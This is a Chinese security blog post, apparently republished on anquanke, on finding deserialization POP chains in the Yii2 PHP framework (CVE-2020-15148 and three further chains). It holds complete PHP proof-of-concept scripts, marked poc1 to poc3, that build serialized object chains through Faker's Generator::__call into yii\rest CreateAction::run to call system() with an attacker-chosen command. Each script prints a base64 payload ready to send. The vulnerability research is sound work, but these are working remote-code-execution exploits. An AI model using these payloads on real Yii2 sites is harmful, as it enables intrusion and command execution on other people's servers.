# 我是如何挖掘yii2反序列化0day的

阅读量 **271277**

|评论 **4**

发布时间 : 2020-09-22 14:30:17

 **x**

##### 译文声明

本文是翻译文章，文章原作者 阿信，文章来源：阿信

原文地址：[https://mp.weixin.qq.com/s?src=11&timestamp=1602841173&ver=2648&signature=FJMVpV6t2C0hdu3dB*odLp2-bVAd8fo-ZbnVzjIF69B1EhRjbBhvYQzDkA4ZGHLw7UWd2*yYm3GmHGoowhA1MbqhaG7*2rL0wD1rhMz600TyTAX9JHHmYJU0XIRUB1j3&new=1](https://mp.weixin.qq.com/s?src=11&timestamp=1602841173&ver=2648&signature=FJMVpV6t2C0hdu3dB*odLp2-bVAd8fo-ZbnVzjIF69B1EhRjbBhvYQzDkA4ZGHLw7UWd2*yYm3GmHGoowhA1MbqhaG7*2rL0wD1rhMz600TyTAX9JHHmYJU0XIRUB1j3&new=1)

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t010892b95c09805cc8.jpg)

🐻弟们，又到周末了，是时候给大家整活儿了

放心，这次不是在线吹牛环节，咱们还是得偶尔换换口味整整硬菜嘛

话说

周五我们小组团建结束，我扶着地铁回到了我温暖的小窝

一进屋，这该死的令人陶醉的氛围就让我丢盔卸甲，疲软不堪，就像是陷入了一位妙龄少女的温柔乡一般

![](https://p1.ssl.qhimg.com/t014dd36e38e9b9c3a8.png)

我顺手把小书包儿一扔，鞋儿一脱，打开电脑准备欣赏一下脱口秀大会，给自己补充点快乐

又顺手打开了荒野乱斗

一边在脱口秀的舞台上补充快乐，一边在多人竞技的战场上独领风骚

这滋味，10瓶肥宅快乐水也换不来呀🤤

可是正当我玩的起劲的时候，我无意间在微信上看到有师傅发了最新的yii2框架反序列化漏洞payload

我立马开始焦虑起来😢，这帮家伙真tm不休息吗

![](https://p2.ssl.qhimg.com/t01f73a5456acccc677.png)

手里的游戏突然就不香了，脱口秀的舞台也黯淡无光了

才怪😏

焦虑归焦虑，夜还是不能熬的呀，猛男从来都是十一点睡觉的，嘤嘤嘤

明天起床搞，于是我在焦虑中睡去，并给自己定了个六点的⏰

果然，今天7：30我起床了👻，一起床我就给了自己两耳光：“废物，你个区区（ ~~赘婿~~ ）菜鸡，还有脸睡懒觉！”

![](https://p2.ssl.qhimg.com/t0150429c05a27bc706.png)

我起床匆匆收拾了一下（ ~~把昨晚没看完的脱口秀大会补完~~ ），然后就开始着手分析这个反序列化POP链了

咱们还是先来分析一下别人的这个利用链，然后，再说我挖到的一大堆利用链🤔

## 漏洞分析

挖掘之前还是要搭建好环境嘛，去github上下载yii2的`2.0.37`版本或其他更低版本

当然，你也可以选择使用composer安装，不过我用composer安装不了（特别慢）所以我是直接到github上下载的

自己在github上下载的yii2需要修改`config/web.php`文件里`cookieValidationKey`的值，随便什么值都行

然后切换到你刚刚下载的yii框架根目录，执行命令`php yii serve`，然后你的yii就在8080端口跑起来了：

![](https://p3.ssl.qhimg.com/t01897e6a9223d9f846.png)

接下来，咱们就要去看利用链了，在没有细节披露的情况下就去看github的commit记录：

![](https://p3.ssl.qhimg.com/t018f135305b9f577ab.png)

上图就是与cve-2020-15148相关的所有更新，可以看到就只是在`yii\db\BatchQueryResult`类里添加了一个`__wakeup`方法，有些朋友可能不太了解这个方法

`__wakeup`方法在类被反序列化时会自动被调用，而这里这么写，目的就是在当BatchQueryResult类被反序列化时就直接报错，避免反序列化的发生，也就避免了漏洞

那从上面的信息就可以知道BatchQueryResult肯定是这个反序列化链中的一环，而且一般都是第一环，所以咱们就直接去看这个类吧

反序列化利用链的关键函数就是`__wakeup`以及`__destruct`,所以，我们直接看`__destruct`:

    
    
    public function __destruct()
    {
        // make sure cursor is closed
        $this->reset();
    }
    
    public function reset()
    {
        if ($this->_dataReader !== null) {
            $this->_dataReader->close();
        }
        $this->_dataReader = null;
        $this->_batch = null;
        $this->_value = null;
        $this->_key = null;
    }
    

destruct方法里调用了reset方法，reset方法里又调用了close()方法，我一开始以为是close()方法有问题，然后我全局搜索了一下close方法，发现好像没有利用点

然后我回去翻了一下我之前挖thinkphp反序列化的文章，复习了一下php反序列化😉

才意识到`$this->_dataREader->close()`这里可以利用魔术方法`__call`，于是开始全局搜索`__call`,出现了很多结果，但是最好利用的一个是`/vendor/fzaninotto/faker/src/Faker/Generator.php`,它的`__call`方法是这样的：

    
    
    public function __call($method, $attributes)
    {
        return $this->format($method, $attributes);
    }
    

我们跟进format:

    
    
    public function format($formatter, $arguments = array())
    {
        return call_user_func_array($this->getFormatter($formatter), $arguments);
    }
    
    public function getFormatter($formatter)
    {
        if (isset($this->formatters[$formatter])) {
            return $this->formatters[$formatter];
        }
        foreach ($this->providers as $provider) {
            if (method_exists($provider, $formatter)) {
                $this->formatters[$formatter] = array($provider, $formatter);
    
                return $this->formatters[$formatter];
            }
        }
        throw new \InvalidArgumentException(sprintf('Unknown formatter "%s"', $formatter));
    }
    

format里调用了call_user_func_array,`$formatter`与`$arguments`我们都不可控，

目前`$formatter='close'`,`$arguments`为空

但是没关系

`$formatter`传入了`$this->getFormatter`,在这个方法中，`$this->formatters`是我们可控的，这也就意味着`getFormatter`方法的返回值是可控的

也就是说call_user_func_array这个函数的第一个参数可控，第二个参数为空

现在我们可以调用yii框架中的任何一个无参的方法了，这还不够，我们需要rce

所以，我们要找一个无参数的方法，在这个方法中我们可以实现任意代码执行或者间接实现任意代码执行

到目前为止我还不知道这个利用链到底有多长，所以，我一开始采用的笨办法就是找出框架中所有的无参数方法，然后一个个排查

当我输入正则：`function \w+\(\)`进行🔍时，直接冒出来几千个无参的函数，这让我怎么玩？

后来才知道大哥们是直接找的调用了call_user_func函数的无参方法，可能这就是大师傅们的经验吧

构造正则：`function \w+\(\) ?\n?\{(.*\n)+call_user_func`

出来22个结果，老怀大慰呀：

![](https://p5.ssl.qhimg.com/t01ee25a62a15e11d65.png)

经过排查，发现`rest/CreateAction.php`以及`rest/IndexAction.php`都特别👍，很好利用

当然，还有其他的，感兴趣的同学可以自行查看

就拿`IndexAction.php`中的run方法来说，代码如下：

    
    
    public function run()
    {
        if ($this->checkAccess) {
            call_user_func($this->checkAccess, $this->id);
        }
    
        return $this->prepareDataProvider();
    }
    

可见`$this->checkAccess`以及`$this->id`都可控，那，这条利用链不就成了吗：

`yii\db\BatchQueryResult::__destruct()  
->  
Faker\Generator::__call()  
->  
yii\rest\IndexAction::run()`

## poc1

构造个payload:

    
    
    <?php
    namespace yii\rest{
        class CreateAction{
            public $checkAccess;
            public $id;
    
            public function __construct(){
                $this->checkAccess = 'system';
                $this->id = 'ls';
            }
        }
    }
    
    namespace Faker{
        use yii\rest\CreateAction;
    
        class Generator{
            protected $formatters;
    
            public function __construct(){
                $this->formatters['close'] = [new CreateAction(), 'run'];
            }
        }
    }
    
    namespace yii\db{
        use Faker\Generator;
    
        class BatchQueryResult{
            private $_dataReader;
    
            public function __construct(){
                $this->_dataReader = new Generator;
            }
        }
    }
    namespace{
        echo base64_encode(serialize(new yii\db\BatchQueryResult));
    }
    ?>
    

然后，我们验证一下payload是否有效，因为这仅仅是一个反序列化利用链，所以还需要一个反序列化的入口点，这个需要我们自己构造

在controllers目录下创建一个Controller:

![](https://p2.ssl.qhimg.com/t01435766cae7acc4e9.png)

然后咱们发送payload:

![](https://p2.ssl.qhimg.com/t016d3acade3ab1b89e.png)

虽然有报错，但是咱们的命令还是执行了的，nice😀

ok,说完别人的，我该来说说自己挖的一些其它链了

## 开始挖掘

从github commit记录我们已经知道新版本的`BatchQueryResult`类已经无法反序列化了，那么我们就需要找一些其它的类了

找其他的类的方式也很简单，全局搜索`__destruct`与`__wakeup`函数，然后一个个排查

`__wakeup`函数都没啥可利用的，但是有几个`__destruct`函数引起了我的注意

第一个自然是`Psr\Http\Message\StreamInterface\FnStream`下的析构函数啦，看看它的代码：

    
    
    public function __destruct()
    {
        if (isset($this->_fn_close)) {
            call_user_func($this->_fn_close);
        }
    }
    

我当时就心想，这么简单的一处反序列化都没发现吗，太菜了8，后来才发现FnStream类也修改了`__wakeup`函数为：

    
    
    public function __wakeup()
    {
        throw new \LogicException('FnStream should never be unserialized');
    }
    

不好意思，是我傻逼了

![](https://p0.ssl.qhimg.com/t0120b2d5fac25f6f74.png)

## 第一条链

那么继续看其它的呗，接下来登场的是`Codeception\Extension\RunProcess`,我们来看下它的`__destruct`方法：

    
    
    public function __destruct()
    {
        $this->stopProcess();
    }
    
    public function stopProcess()
    {
        foreach (array_reverse($this->processes) as $process) {
            /** @var $process Process  **/
            if (!$process->isRunning()) {
                continue;
            }
            $this->output->debug('[RunProcess] Stopping ' . $process->getCommandLine());
            $process->stop();
        }
        $this->processes = [];
    }
    

从上述代码可以看到`$this->processes`可控，那也就意味着`$process`可控，然后下面又调用了`$process->isRunning`,这不又可以接上第一条利用链的`__call`方法开头的后半段吗？

然后利用链变成：

`Codeception\Extension\RunProcess::__destruct()  
->  
Faker\Generator::__call()  
->  
yii\rest\IndexAction::run()`

## poc2

    
    
    <?php
    namespace yii\rest{
        class CreateAction{
            public $checkAccess;
            public $id;
    
            public function __construct(){
                $this->checkAccess = 'system';
                $this->id = 'ls';
            }
        }
    }
    
    namespace Faker{
        use yii\rest\CreateAction;
    
        class Generator{
            protected $formatters;
    
            public function __construct(){
                // 这里需要改为isRunning
                $this->formatters['isRunning'] = [new CreateAction(), 'run'];
            }
        }
    }
    
    // poc2
    namespace Codeception\Extension{
        use Faker\Generator;
        class RunProcess{
            private $processes;
            public function __construct()
            {
                $this->processes = [new Generator()];
            }
        }
    }
    namespace{
        // 生成poc
        echo base64_encode(serialize(new Codeception\Extension\RunProcess()));
    }
    ?>
    

## 第二条

然后再来看看类`Swift_KeyCache_DiskKeyCache`，看看它的`__destruct`:

    
    
    public function __destruct()
    {
        foreach ($this->keys as $nsKey => $null) {
            $this->clearAll($nsKey);
        }
    }
    

跟进clearAll方法：

    
    
    public function clearAll($nsKey)
    {
        if (array_key_exists($nsKey, $this->keys)) {
            foreach ($this->keys[$nsKey] as $itemKey => $null) {
                $this->clearKey($nsKey, $itemKey);
            }
            ....
        }
    }
    

这里的`$this->keys`以及`$nsKey、$itemKey`啥的都是我们可控的，所以是可以执行到`$this->clearKey`的，跟进去：

    
    
    public function clearKey($nsKey, $itemKey)
    {
        if ($this->hasKey($nsKey, $itemKey)) {
            $this->freeHandle($nsKey, $itemKey);
            unlink($this->path.'/'.$nsKey.'/'.$itemKey);
        }
    }
    

这里的`$this->path`也可控，这就方便了，可以看到这里是进行了一个字符串拼接操作，那么意味着可以利用魔术方法`__toString`来触发后续操作

全局搜索一下`__toString`方法，真的不少呀：

![](https://p2.ssl.qhimg.com/t0166afde1bbb95ff06.png)

这怎么都能找到一个能利用的吧，我随便找了一下，就有三个，就随便拿一个说吧：

![](https://p3.ssl.qhimg.com/t010bbca98c74df5005.png)

上图是我挖的过程中做的笔记😂

就拿`See.php`中的`__toString`举例,代码如下：

    
    
    public function __toString() : string
    {
        return $this->refers . ($this->description ? ' ' . $this->description->render() : '');
    }
    

可以看到`$this->description`可控，又可以利用`__call`，新链出炉：

`Swift_KeyCache_DiskKeyCache  
->  
phpDocumentor\Reflection\DocBlock\Tags\See::__toString()->  
Faker\Generator::__call()  
->  
yii\rest\IndexAction::run()`

## poc3

    
    
    <?php
    namespace yii\rest{
        class CreateAction{
            public $checkAccess;
            public $id;
    
            public function __construct(){
                $this->checkAccess = 'system';
                $this->id = 'ls';
            }
        }
    }
    
    namespace Faker{
        use yii\rest\CreateAction;
    
        class Generator{
            protected $formatters;
    
            public function __construct(){
                // 这里需要改为isRunning
                $this->formatters['render'] = [new CreateAction(), 'run'];
            }
        }
    }
    
    namespace phpDocumentor\Reflection\DocBlock\Tags{
    
        use Faker\Generator;
    
        class See{
            protected $description;
            public function __construct()
            {
                $this->description = new Generator();
            }
        }
    }
    namespace{
        use phpDocumentor\Reflection\DocBlock\Tags\See;
        class Swift_KeyCache_DiskKeyCache{
            private $keys = [];
            private $path;
            public function __construct()
            {
                $this->path = new See;
                $this->keys = array(
                    "axin"=>array("is"=>"handsome")
                );
            }
        }
        // 生成poc
        echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
    }
    ?>
    

当然，如果你想要一条全新的链也不是不行，只不过我要吃午🍚去了，下次见

本文翻译自阿信
[原文链接](https://mp.weixin.qq.com/s?src=11&timestamp=1602841173&ver=2648&signature=FJMVpV6t2C0hdu3dB*odLp2-bVAd8fo-ZbnVzjIF69B1EhRjbBhvYQzDkA4ZGHLw7UWd2*yYm3GmHGoowhA1MbqhaG7*2rL0wD1rhMz600TyTAX9JHHmYJU0XIRUB1j3&new=1)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **阿信** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/217930](/post/id/217930)

安全客 - 有思想的安全新媒体

本文转载自:
[阿信](https://mp.weixin.qq.com/s?src=11&timestamp=1602841173&ver=2648&signature=FJMVpV6t2C0hdu3dB*odLp2-bVAd8fo-ZbnVzjIF69B1EhRjbBhvYQzDkA4ZGHLw7UWd2*yYm3GmHGoowhA1MbqhaG7*2rL0wD1rhMz600TyTAX9JHHmYJU0XIRUB1j3&new=1)

如若转载,请注明出处：
[https://mp.weixin.qq.com/s?src=11&timestamp=1602841173&ver=2648&signature=FJMVpV6t2C0hdu3dB*odLp2-bVAd8fo-ZbnVzjIF69B1EhRjbBhvYQzDkA4ZGHLw7UWd2*yYm3GmHGoowhA1MbqhaG7*2rL0wD1rhMz600TyTAX9JHHmYJU0XIRUB1j3&new=1](https://mp.weixin.qq.com/s?src=11&timestamp=1602841173&ver=2648&signature=FJMVpV6t2C0hdu3dB*odLp2-bVAd8fo-ZbnVzjIF69B1EhRjbBhvYQzDkA4ZGHLw7UWd2*yYm3GmHGoowhA1MbqhaG7*2rL0wD1rhMz600TyTAX9JHHmYJU0XIRUB1j3&new=1)

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [漏洞挖掘](/tag/漏洞挖掘)

 **+1** __19赞

 __收藏

![](https://thirdwx.qlogo.cn/mmopen/vi_32/fIsIdkaebDRWUxUVMFxrUic8A8gqtXUK9icHTF0UVhfQljGWQgpibJQ2icibDJu2Y9AEiaYODG97JWnn1XloWnmzj2eA/132)
阿信

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

